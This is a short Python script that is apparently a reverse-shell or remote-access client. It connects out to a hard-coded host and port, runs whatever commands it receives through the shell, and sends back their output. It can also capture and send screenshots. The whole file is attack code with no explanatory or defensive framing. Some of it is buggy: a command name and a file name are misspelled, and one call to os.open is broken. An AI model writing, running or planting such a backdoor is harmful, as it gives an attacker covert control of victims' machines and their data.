import socket, os, subprocess
from mss import mss

def screenshot():
    with mss() as sct:
        sct.shot(output="screen.png")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "10.0.2.6"
port = 12345

s.connect((host, port))

while True:
    command = s.recv(1024).decode("utf-8")
    if command == "goodbye":
        s.send(b'close')
        s.close()
        break
    elif command == "scrennshot":
        screenshot()
        len_img = str(os.path.getsize("sreen.png"))
        s.send(len_img.encode("utf-8"))
        with open("screen.png", "rb") as img:
            s.send(img.read())
    elif command == "cd":
        result = subprocess.Popen("cd", shell=True, stdout=subprocess.PIPE)
        s.send(result.stdout.read())
    elif command[:2] == "cd":
        if os.path.exists(str(command[3:].replace("\n", ""))):
            os.chdir(str(command[3:].replace("\n", "")))
            s.send(os.open("cd").encode("utf-8"))
    else:
        r = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = r.communicate()
        if result[1]:
            s.send(result[1])
        else:
            s.send(result[0])
